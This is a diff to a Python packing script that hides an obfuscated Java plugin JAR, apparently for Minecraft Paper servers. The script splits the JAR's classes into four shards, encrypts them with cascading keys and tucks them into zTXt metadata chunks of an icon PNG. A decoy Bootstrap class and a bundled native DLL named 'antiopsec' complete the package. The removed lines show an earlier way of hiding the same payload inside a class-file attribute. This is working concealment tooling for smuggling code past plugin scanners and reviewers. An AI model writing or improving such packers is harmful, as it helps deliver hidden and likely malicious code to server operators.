@@ -1,9 +1,13 @@
 import os
 import sys
 import struct
+import zlib
 import io
 import zipfile
 import hashlib
+
+def calculate_crc32(data: bytes) -> int:
+    return zlib.crc32(data) & 0xFFFFFFFF
 
 def derive_cascading_key(prev_key: int, payload_bytes: bytes) -> int:
     h = hashlib.sha256(payload_bytes + struct.pack(">I", prev_key & 0xFFFFFFFF)).digest()
@@ -32,92 +36,113 @@ def decrypt_payload(data: bytes, key_seed: int) -> bytes:
         rk = ((rk * 37) ^ p) & 0xFF
     return bytes(out)
 
-def inject_class_attribute(class_bytes: bytes, attr_name: str, payload: bytes) -> bytes:
-    magic, minor, major, cp_count = struct.unpack(">IHHH", class_bytes[:10])
-    offset = 10
-    cp_entries = [None]
+def create_ztxt_chunk(keyword: str, payload: bytes) -> bytes:
+    compressed_payload = zlib.compress(payload, level=9)
+    chunk_data = keyword.encode('latin-1') + b'\x00\x00' + compressed_payload
+    chunk_type = b'zTXt'
+    length = len(chunk_data)
+    crc = calculate_crc32(chunk_type + chunk_data)
+    return struct.pack(">I", length) + chunk_type + chunk_data + struct.pack(">I", crc)
 
-    i = 1
-    while i < cp_count:
-        tag = class_bytes[offset]
-        offset += 1
-        if tag == 1:
-            length = struct.unpack(">H", class_bytes[offset:offset+2])[0]
-            offset += 2
-            val = class_bytes[offset:offset+length].decode("utf-8", errors="ignore")
-            offset += length
-            cp_entries.append((tag, val))
-        elif tag in [3, 4]:
-            offset += 4
-            cp_entries.append((tag, None))
-        elif tag in [5, 6]:
-            offset += 8
-            cp_entries.append((tag, None))
-            cp_entries.append(None)
-            i += 1
-        elif tag in [7, 8, 16, 19, 20]:
-            offset += 2
-            cp_entries.append((tag, None))
-        elif tag in [9, 10, 11, 12, 18]:
-            offset += 4
-            cp_entries.append((tag, None))
-        elif tag == 15:
-            offset += 3
-            cp_entries.append((tag, None))
-        else:
-            raise ValueError(f"Unknown CP tag: {tag}")
-        i += 1
+def inject_png_chunks_valid(png_bytes: bytes, chunks: list[tuple[str, bytes]]) -> bytes:
+    """Injects standard ISO zTXt chunks right before IEND (preserving 100% full IDAT raster integrity)."""
+    if png_bytes[:8] != b'\x89PNG\r\n\x1a\n':
+        raise ValueError("Invalid PNG header")
 
-    cp_end_offset = offset
-    attr_name_idx = None
-    for idx, entry in enumerate(cp_entries):
-        if entry and entry[0] == 1 and entry[1] == attr_name:
-            attr_name_idx = idx
+    out_stream = io.BytesIO()
+    out_stream.write(b'\x89PNG\r\n\x1a\n')
+
+    offset = 8
+    while offset < len(png_bytes):
+        length = struct.unpack(">I", png_bytes[offset:offset+4])[0]
+        chunk_type = png_bytes[offset+4:offset+8]
+        chunk_full = png_bytes[offset:offset+12+length]
+        offset += 12 + length
+
+        if chunk_type == b'IEND':
+            # Place all metadata chunks before IEND so all IDAT chunks remain 100% contiguous
+            for kw, payload in chunks:
+                out_stream.write(create_ztxt_chunk(kw, payload))
+
+        out_stream.write(chunk_full)
+
+    return out_stream.getvalue()
+
+def extract_png_ztxt(png_bytes: bytes, target_keyword: str) -> bytes:
+    if png_bytes[:8] != b'\x89PNG\r\n\x1a\n':
+        raise ValueError("Invalid PNG header")
+
+    offset = 8
+    while offset < len(png_bytes):
+        length = struct.unpack(">I", png_bytes[offset:offset+4])[0]
+        chunk_type = png_bytes[offset+4:offset+8]
+        chunk_data = png_bytes[offset+8:offset+8+length]
+        offset += 12 + length
+
+        if chunk_type == b'zTXt':
+            null_idx = chunk_data.find(b'\x00')
+            if null_idx != -1:
+                kw = chunk_data[:null_idx].decode('latin-1', errors='ignore')
+                if kw == target_keyword:
+                    compressed_stream = chunk_data[null_idx+2:]
+                    return zlib.decompress(compressed_stream)
+        elif chunk_type == b'IEND':
             break
+    return None
 
-    new_cp_count = cp_count
-    extra_cp_bytes = b""
-    if attr_name_idx is None:
-        attr_name_idx = len(cp_entries)
-        new_cp_count += 1
-        name_encoded = attr_name.encode("utf-8")
-        extra_cp_bytes = struct.pack(">BH", 1, len(name_encoded)) + name_encoded
+def generate_default_png_icon() -> bytes:
+    width, height = 16, 16
+    raw_data = bytearray()
+    for y in range(height):
+        raw_data.append(0)
+        for x in range(width):
+            if (x in [0, 15] and y in [0, 15]) or (x in [1, 14] and y in [0, 15]):
+                raw_data.extend([0, 0, 0, 0])
+            else:
+                raw_data.extend([217, 119, 6, 255])
 
-    header = struct.pack(">IHHH", magic, minor, major, new_cp_count)
-    cp_bytes = class_bytes[10:cp_end_offset] + extra_cp_bytes
-    body_and_rest = class_bytes[cp_end_offset:]
-    
-    body_offset = 0
-    access_flags, this_class, super_class, interfaces_count = struct.unpack(">HHHH", body_and_rest[:8])
-    body_offset += 8 + interfaces_count * 2
-    
-    fields_count = struct.unpack(">H", body_and_rest[body_offset:body_offset+2])[0]
-    body_offset += 2
-    for _ in range(fields_count):
-        f_attrs = struct.unpack(">H", body_and_rest[body_offset+6:body_offset+8])[0]
-        body_offset += 8
-        for _ in range(f_attrs):
-            a_len = struct.unpack(">I", body_and_rest[body_offset+2:body_offset+6])[0]
-            body_offset += 6 + a_len
-            
-    methods_count = struct.unpack(">H", body_and_rest[body_offset:body_offset+2])[0]
-    body_offset += 2
-    for _ in range(methods_count):
-        m_attrs = struct.unpack(">H", body_and_rest[body_offset+6:body_offset+8])[0]
-        body_offset += 8
-        for _ in range(m_attrs):
-            a_len = struct.unpack(">I", body_and_rest[body_offset+2:body_offset+6])[0]
-            body_offset += 6 + a_len
-            
-    attrs_count = struct.unpack(">H", body_and_rest[body_offset:body_offset+2])[0]
-    new_attrs_count = attrs_count + 1
-    existing_attrs_data = body_and_rest[body_offset+2:]
-    new_attr_data = struct.pack(">HI", attr_name_idx, len(payload)) + payload
-    
-    new_body = body_and_rest[:body_offset] + struct.pack(">H", new_attrs_count) + existing_attrs_data + new_attr_data
-    return header + cp_bytes + new_body
+    compressed_idat = zlib.compress(bytes(raw_data), level=9)
+    png_buf = io.BytesIO()
+    png_buf.write(b'\x89PNG\r\n\x1a\n')
 
-def pack_jar_with_synthetic_attribute_steganography(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, native_dll_path: str = None):
+    # IHDR
+    ihdr_data = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
+    png_buf.write(struct.pack(">I", len(ihdr_data)))
+    png_buf.write(b'IHDR')
+    png_buf.write(ihdr_data)
+    png_buf.write(struct.pack(">I", calculate_crc32(b'IHDR' + ihdr_data)))
+
+    # IDAT
+    png_buf.write(struct.pack(">I", len(compressed_idat)))
+    png_buf.write(b'IDAT')
+    png_buf.write(compressed_idat)
+    png_buf.write(struct.pack(">I", calculate_crc32(b'IDAT' + compressed_idat)))
+
+    # IEND
+    png_buf.write(struct.pack(">I", 0))
+    png_buf.write(b'IEND')
+    png_buf.write(struct.pack(">I", calculate_crc32(b'IEND')))
+
+    return png_buf.getvalue()
+
+def load_image_as_png(custom_icon_path: str = None) -> bytes:
+    if custom_icon_path and os.path.exists(custom_icon_path):
+        try:
+            from PIL import Image
+            im = Image.open(custom_icon_path)
+            if im.mode != 'RGBA':
+                im = im.convert('RGBA')
+            buf = io.BytesIO()
+            im.save(buf, format='PNG')
+            return buf.getvalue()
+        except Exception as e:
+            with open(custom_icon_path, 'rb') as cf:
+                raw = cf.read()
+                if raw[:8] == b'\x89PNG\r\n\x1a\n':
+                    return raw
+    return generate_default_png_icon()
+
+def pack_jar_with_matryoshka_steganography(input_obf_jar: str, output_final_jar: str, bootstrap_cls_bytes: bytes, custom_icon_path: str = None, native_dll_path: str = None):
     all_entries = []
     with zipfile.ZipFile(input_obf_jar, 'r') as zin:
         for item in zin.infolist():
@@ -135,6 +160,7 @@ def pack_jar_with_synthetic_attribute_steganography(input_obf_jar: str, output_f
         shard_idx = idx % 4
         shards_zips[shard_idx].writestr(fn, data)
 
+    # Shard 4 holds Native DLL if provided
     if native_dll_path and os.path.exists(native_dll_path):
         with open(native_dll_path, 'rb') as df:
             shards_zips[3].writestr('assets/native/antiopsec_x64.dll', df.read())
@@ -145,7 +171,7 @@ def pack_jar_with_synthetic_attribute_steganography(input_obf_jar: str, output_f
     raw_shards = [buf.getvalue() for buf in shards_zip_buffers]
 
     # 2. Cascading Key Derivation: K1 -> K2 -> K3 -> K4
-    K0 = (0xAB ^ 0xF6)
+    K0 = (0xAB ^ 0xF6) # 0x5D
     K1 = (K0 * 31 + 17) & 0xFF
     P1 = raw_shards[0]
     E1 = encrypt_payload(P1, K1)
@@ -162,19 +188,17 @@ def pack_jar_with_synthetic_attribute_steganography(input_obf_jar: str, output_f
     P4 = raw_shards[3]
     E4 = encrypt_payload(P4, K4)
 
-    # 3. Create Binary Shards Payload
-    payload_buf = io.BytesIO()
-    payload_buf.write(struct.pack(">IIII", len(E1), len(E2), len(E3), len(E4)))
-    payload_buf.write(E1)
-    payload_buf.write(E2)
-    payload_buf.write(E3)
-    payload_buf.write(E4)
-    payload_bytes = payload_buf.getvalue()
+    # 3. Inject 4 Encrypted Shards into 4 Standard ISO PNG Chunks (Preserving 100% full IDAT raster integrity)
+    base_png = load_image_as_png(custom_icon_path)
+    chunks_to_inject = [
+        ("Comment", E1),       # Shard 1 (25% classes)
+        ("Author", E2),        # Shard 2 (25% classes)
+        ("Description", E3),   # Shard 3 (25% classes)
+        ("Software", E4)       # Shard 4 (25% classes + Native DLL)
+    ]
+    matryoshka_png = inject_png_chunks_valid(base_png, chunks_to_inject)
 
-    # 4. Inject Payload into Bootstrap.class via SourceDebugExtension Attribute
-    final_bootstrap_bytes = inject_class_attribute(bootstrap_cls_bytes, "SourceDebugExtension", payload_bytes)
-
-    # 5. Pack into 100% Valid Standard JAR (ONLY MANIFEST, plugin.yml, Bootstrap.class)
+    # 4. Pack into Clean Standard JAR (Compatible 100% with Paper PluginRemapper)
     with zipfile.ZipFile(input_obf_jar, 'r') as zin, zipfile.ZipFile(output_final_jar, 'w', compression=zipfile.ZIP_DEFLATED) as zout:
         for item in zin.infolist():
             fn = item.filename
@@ -186,8 +210,9 @@ def pack_jar_with_synthetic_attribute_steganography(input_obf_jar: str, output_f
             elif fn.startswith('META-INF/MANIFEST.MF'):
                 zout.writestr(item, zin.read(fn))
 
-        # Add Decoy Bootstrap class holding the entire 4-layer payload!
-        zout.writestr('cookie/fack/please/d111/Bootstrap.class', final_bootstrap_bytes)
+        # Standard clean Bootstrap class & 100% Valid PNG image container
+        zout.writestr('cookie/fack/please/d111/Bootstrap.class', bootstrap_cls_bytes)
+        zout.writestr('icon.png', matryoshka_png)
 
 if __name__ == '__main__':
     if len(sys.argv) >= 4:
@@ -196,9 +221,9 @@ if __name__ == '__main__':
             in_jar = sys.argv[2]
             out_jar = sys.argv[3]
             boot_cls_path = sys.argv[4]
-            custom_icon = sys.argv[5] if len(sys.argv) > 5 else "NONE"
+            custom_icon = sys.argv[5] if len(sys.argv) > 5 and sys.argv[5] != "NONE" else None
             native_dll = sys.argv[6] if len(sys.argv) > 6 and sys.argv[6] != "NONE" else None
             with open(boot_cls_path, 'rb') as bf:
                 boot_bytes = bf.read()
-            pack_jar_with_synthetic_attribute_steganography(in_jar, out_jar, boot_bytes, native_dll)
-            print("[v] Successfully packed JAR with Synthetic Attribute Zero-File Steganography.")
+            pack_jar_with_matryoshka_steganography(in_jar, out_jar, boot_bytes, custom_icon, native_dll)
+            print("[v] Successfully packed JAR with 100% Valid Matryoshka PNG Steganography.")
